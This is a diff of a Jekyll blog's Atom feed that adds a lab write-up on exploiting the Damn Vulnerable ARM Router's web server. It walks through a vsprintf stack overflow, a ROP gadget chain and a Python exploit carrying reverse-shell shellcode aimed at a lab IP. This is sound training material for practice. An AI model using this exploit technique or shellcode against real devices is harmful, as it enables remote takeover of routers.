@@ -1,51 +1,415 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-07-14T06:40:13-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Sungur Labs</title><subtitle>Description here.
-</subtitle><author><name>GitHub User</name></author><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/2019/04/16/welcome-to-jekyll2.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2019-04-16T00:00:00-07:00</published><updated>2019-04-16T00:00:00-07:00</updated><id>http://localhost:4000/2019/04/16/welcome-to-jekyll2</id><content type="html" xml:base="http://localhost:4000/2019/04/16/welcome-to-jekyll2.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-29T07:38:34-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Sungur Labs</title><subtitle>This is a project that aims to do security research around low-level area.
+</subtitle><author><name>GitHub User</name></author><entry><title type="html">[write-up] Damn Vulnerable Arm Router</title><link href="http://localhost:4000/2021/09/30/write-up-damn-vulnerable-arm-router.html" rel="alternate" type="text/html" title="[write-up] Damn Vulnerable Arm Router" /><published>2021-09-30T00:00:00-07:00</published><updated>2021-09-30T00:00:00-07:00</updated><id>http://localhost:4000/2021/09/30/write-up-damn-vulnerable-arm-router</id><content type="html" xml:base="http://localhost:4000/2021/09/30/write-up-damn-vulnerable-arm-router.html">&lt;p&gt;(This article was previously written in Turkish by one of our teammates. Oct 24, 2020)&lt;/p&gt;
 
-&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+&lt;p&gt;Hello, in this article, we will solve the DVAR machine, which you can reach from &lt;a href=&quot;https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html&quot;&gt;this&lt;/a&gt; address. DVAR is an ARM Linux based router virtual machine. It runs a web server that acts as an admin panel. Using the vulnerability found in this web server, we will prepare an exploit code that can remotely control the router. When we run the virtual machine, it gives us an IP address and we can access the router management panel with this address. As seen in the picture below, some services are running on 3 different ports on the router. With port 22, we can make ssh connection to the device and control the device. In the debugging phase, ssh will help us. Two different web servers are running on ports 80 and 8080. There is a router interface on port 80. On the 8080 port, there is a traffic light application. In this article, we will examine the service on port 80. Traffic light application is the subject of another article.&lt;/p&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;“This is a quote which should be followed”
-Also I think this sentence is quite long.
-more quote text to come&lt;/p&gt;
-  &lt;ul&gt;
-    &lt;li&gt;Chris Wayne&lt;/li&gt;
-  &lt;/ul&gt;
-&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;/images/dvar_1.png&quot; alt=&quot;dvar_1.png&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;However, these are bulletpoints:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/dvar_2.png&quot; alt=&quot;dvar_2.png&quot; /&gt;&lt;/p&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;To add new posts, simply add a file in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/li&gt;
-  &lt;li&gt;another point&lt;/li&gt;
-  &lt;li&gt;that’s it&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;When we reach the address 192.168.227.128:80 on our host machine, the router admin panel welcomes us. There are some settings that we are used to seeing in a classic router management panel. With the “HELPFUL HINTS” button at the bottom, we can view the page where we can get some tips about the challenge.&lt;/p&gt;
 
-&lt;p&gt;However, these entries should not be styled:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/dvar_3.png&quot; alt=&quot;dvar_3.png&quot; /&gt;&lt;/p&gt;
 
-&lt;ol&gt;
-  &lt;li&gt;an entry&lt;/li&gt;
-  &lt;li&gt;another entry&lt;/li&gt;
-  &lt;li&gt;that’s another entry&lt;/li&gt;
-&lt;/ol&gt;
+&lt;p&gt;As we can see from the steps, we will cause a stack-based buffer overflow with an HTTP request, and then we will redirect the program to our own shellcode by controlling the PC register. To find out which process is running on port 80, we can use the “netstat -apeen” command after connecting to the machine via ssh. As seen in the picture, the process named “miniweb” runs the administration panel application we are interested in.&lt;/p&gt;
 
-&lt;video preload=&quot;auto&quot; poster=&quot;https://pbs.twimg.com/tweet_video_thumb/D5aj3tfW0AIiSxo.jpg&quot; src=&quot;https://video.twimg.com/tweet_video/D5aj3tfW0AIiSxo.mp4&quot; type=&quot;video/mp4&quot; autoplay=&quot;&quot; controls=&quot;&quot;&gt;&lt;/video&gt;
+&lt;p&gt;&lt;img src=&quot;/images/dvar_4.png&quot; alt=&quot;dvar_4.png&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+&lt;p&gt;Let’s examine the admin panel to identify the relevant HTTP request that caused the vulnerability.&lt;/p&gt;
 
-&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;
+&lt;p&gt;&lt;img src=&quot;/images/dvar_5.png&quot; alt=&quot;dvar_5.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The HTTP request that occurs when we enter the “TEST” value in the Host name field and click the “Save Settings” button is as follows.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_6.png&quot; alt=&quot;dvar_6.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At first we can use gdb to monitor the behavior of the program and see possible crashes. For this, we will use the gdbserver already installed on the virtual machine. “gdbserver :1234 –attach $(pidof miniweb)” with this command, we will be able to debug the miniweb process in the virtual machine through our host machine. We can use gdb-multiarch because our host machine is intel architecture and the program we will debug has ARM architecture. After starting gdb-multiarch without parameters, we can now debug the mini web process running in the virtual machine with the command “target remote 192.168.227.128:1234”. Since the miniweb server creates a new child process with each request we send, we will be able to capture the child processes related to this command “set follow-fork-mode child”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_7.png&quot; alt=&quot;dvar_7.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we have prepared the debug environment that can investigate the crash.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_8.png&quot; alt=&quot;dvar_8.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After running the Continue (c) command, the program starts to wait for requests from the user. At this point we can examine the behavior of the program by sending different types of requests. As a result of my experiments, I noticed that there was a crash when too many values were entered in the request query.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_9.png&quot; alt=&quot;dvar_9.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The vulnerability is in the Log() function in the miniweb binary. The log() function writes the user’s request URL and IP address to a specific log file. The vsprintf() function in the standard C library is used for this writing. The vsprintf() function allows to write the arguments in the va_list formatted to a specified stream. When using vsprintf(), since the IP and URL arguments are processed without checking their sizes, the allocated buffer area overflow and vulnerability occurs. The assembly commands of the part that causes the security vulnerability in the Log() function are shown in the picture below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_10.png&quot; alt=&quot;dvar_10.png&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;vsprintf@plt (
+       $r0 = buffer,
+       $r1 = Format string → &quot;Connection from %s, request = &quot;GET %s&quot;&quot;,
+       $r2 = IP,
+       $r3 = URL
+    )
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Normally, the data in the log file is as follows.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_11.png&quot; alt=&quot;dvar_11.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_12.png&quot; alt=&quot;dvar_12.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As seen in the picture, we were able to overwrite the PC and LR registers. At this point, we should pay attention to one detail. Although we only sent the ‘A’ character, the last value in the PC register was set to 0 when expected to be 1. This is an issue related to the use of registers during mode switching on ARM processors. This behavior occurs because the least significant bit (lsb) of the PC register is automatically set to 0 by the processor. We should pay attention to this detail while preparing the exploit code.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_13.png&quot; alt=&quot;dvar_13.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the next step, we need to find the offset value. In this way, we can learn after how many characters we can write on the PC. We can use the “pattern create” feature in gef for this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_14.png&quot; alt=&quot;dvar_14.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_15.png&quot; alt=&quot;dvar_15.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_16.png&quot; alt=&quot;dvar_16.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As can be seen from the last picture, we learned that the offset value is 341. At this point, we can change the flow of the program as we want. As you can see from the picture below, there are no security protections in the program. This means that we can easily run the shellcode that we will place in the stack area.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_17.png&quot; alt=&quot;dvar_17.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As can be seen in the picture below, the program returns operation with the “pop {r11,lr}” and “bx lr” instruction at address 0x0001353c. The value of the LR register is taken from the stack and the program branches to that address. Since we can already write on LR, we can redirect the program wherever we want. At this point, we will try to run our shellcode by redirecting the program flow to the stack area using the ROP technique. In order for the program to run the shellcode on the stack, we will need an instruction such as “mov pc，sp”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_18.png&quot; alt=&quot;dvar_18.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can search for the instructions we need within the program, as well as in shared libraries. Our task will be easier as there is no ASLR protection. We will use the tool called ropper for this. We can use vmmap command on gef to see the libraries imported by the program and their paths.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_19.png&quot; alt=&quot;dvar_19.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We will need to import the library file to our host machine so that we can search for the instructions we need in the libc.so library with the Ropper tool. For this, we can copy the library file to the server root directory and bring it to our host machine with the help of wget.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /lib/libc.so /www/htdocs/ 
+wget http://192.168.227.128/libc.so
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h1 id=&quot;an-interesting-fact-on-the-economy-of-modern-america&quot;&gt;An interesting fact on the economy of modern America&lt;/h1&gt;
+&lt;p&gt;When we searched for the mov command to place the sp address in the pc register with the command “ropper -file libc.so -search “mov pc, sp”” we could not get any results.&lt;/p&gt;
 
-&lt;p&gt;Pictures look like this:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/dvar_20.png&quot; alt=&quot;dvar_20.png&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://picsum.photos/200&quot; alt=&quot;image&quot; class=&quot;modal&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;If this instruction we are looking for existed, we could easily redirect the program flow to the stack area. We will now look for ways to do this indirectly. For this, we can look for instructions to move the SP address to a specific register and move this register to the PC register. First, let’s see the instructions that move to the PC register.&lt;/p&gt;
 
-&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/dvar_21.png&quot; alt=&quot;dvar_21.png&quot; /&gt;&lt;/p&gt;
 
-&lt;blockquote class=&quot;twitter-tweet&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;&lt;a href=&quot;https://twitter.com/hashtag/jekyll?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#jekyll&lt;/a&gt; &lt;a href=&quot;https://twitter.com/hashtag/dash?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#dash&lt;/a&gt; now officially supports both, dark and light theming. Enjoy!&lt;a href=&quot;https://t.co/4evp9pX2Ws&quot;&gt;https://t.co/4evp9pX2Ws&lt;/a&gt; &lt;a href=&quot;https://t.co/vOQCZjGKic&quot;&gt;pic.twitter.com/vOQCZjGKic&lt;/a&gt;&lt;/p&gt;&amp;mdash; 〽️ɪɢᴜᴇʟ (@bitbrain_) &lt;a href=&quot;https://twitter.com/bitbrain_/status/1166440978124877827?ref_src=twsrc%5Etfw&quot;&gt;August 27, 2019&lt;/a&gt;&lt;/blockquote&gt;
-&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;</content><author><name>GitHub User</name></author><category term="welcome" /><category term="introduction" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry></feed>
+&lt;p&gt;Two different instructions were found. The “mov pc, r5” instruction is good enough for us. In the next step, let’s check if there is an instruction where the SP register is assigned to the r5 register.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_22.png&quot; alt=&quot;dvar_22.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Unfortunately, it did not turn out as we intended. At this point, it seems that the number of gadgets we will use will increase. We should be able to somehow assign the SP address to the r5 register. We can use one more register to do this. Let’s determine the other registers that assign the r5 register.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_23.png&quot; alt=&quot;dvar_23.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As can be understood from the output, we see that there are r0,r1,r3 registers assigned to the r5 register. If we assume that SP address is assigned to one of these three registers, we will reach our goal. Let’s test this scenario for register r0.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_24.png&quot; alt=&quot;dvar_24.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yes we are on our lucky day, the instruction at 0x00024100 is fine for us. Finally, we have identified gadgets that will indirectly perform the “mov pc, sp” function.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1 - 0x00024100: mov r0, sp; blx r6; 
+2 - 0x00052454: mov r5, r0; cmp r3, #0; mov r4, r1; beq #0x52478; blx r3; 
+3 - 0x0004d8d4: mov pc, r5; mov r7, #1; svc #0; mov lr, pc; bx r5;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At the last stage, we must associate the addresses they return with each other so that the gadgets we have determined can work in order. We currently have 3 gadgets and two of them have return addresses in registers r3 and r6. We must assign the address 0x00024100 to the PC register, the address 0x00052454 to the r6 register, and the 0x0004d8d4 to the r3 register. We can make these assignments with an suitable pop instruction.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/dvar_25.png&quot; alt=&quot;dvar_25.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So far, we have determined the ROP steps that will make our shellcode work.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1 - 0x0003c8f0: pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}; 
+2 - 0x00024100: mov r0, sp; blx r6; 
+3 - 0x00052454: mov r5, r0; cmp r3, #0; mov r4, r1; beq #0x52478; blx r3; 
+4 - 0x0004d8d4: mov pc, r5; mov r7, #1; svc #0; mov lr, pc; bx r5; 
+5 - Shellcode
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we remember, the stack overflow vulnerability was in the Log() function in the program and it crashed when trying to branch into the overwritten LR register. At this point, we will give the address of the first gadget to the LR register and the program will not crash and will continue to run in the flow we set.&lt;/p&gt;
+
+&lt;p&gt;log() function:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;.
+.
+.
+pop {r11,lr};
+add sp,sp,#16;
+bl lr;&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It’s time to prepare the exploit code. There are some details we should pay attention to. Since the stack area is reduced to 16 bytes at the output of the log function, we must enter an extra 16 characters in our payload. In addition, since the addresses of our gadgets are referenced from the zero address, those addresses we have determined are not correct. The gadgets are in the “libc.so” library and this library is located in the program memory area from 0x40000000. Therefore, when adding the gadget addresses to the exploit code, we should add this offset value.&lt;/p&gt;
+
+&lt;p&gt;The final exploit code is as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;337&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;AAAA&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4003c8f0&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#0x40000000 + 0x0003c8f0
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stuff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4004d8d4&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#0x40000000 + 0x0004d8d4
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BBBB&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;CCCC&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40052454&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#0x40000000 + 0x00052454
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;DDDD&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;EEEE&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;FFFF&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;GGGG&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;HHHH&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400240fc&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#0x40000000 + 0x400240fc 
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reverse_shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x40\x40\x02\x30\x01\x21\x52\x40\x64\x27\xb5\x37\x01\xdf\x06\x1c\x0b\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x30\x1c\x49\x40\x3f\x27\x01\xdf\x30\x1c\x01\x31\x01\xdf\x30\x1c\x01\x31\x01\xdf\x06\xa0\x52\x40\x05\xb4\x69\x46\xc2\x71\x0b\x27\x01\xdf\xff\xff\xff\xff\x02\xaa\x11\x5c\xc0\xa8\xe3\x82\x2f\x62\x69\x6e\x2f\x73\x68\x58&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r11&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stuff&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r5&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r7&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r8&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sl&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reverse_shell&lt;/span&gt;
+
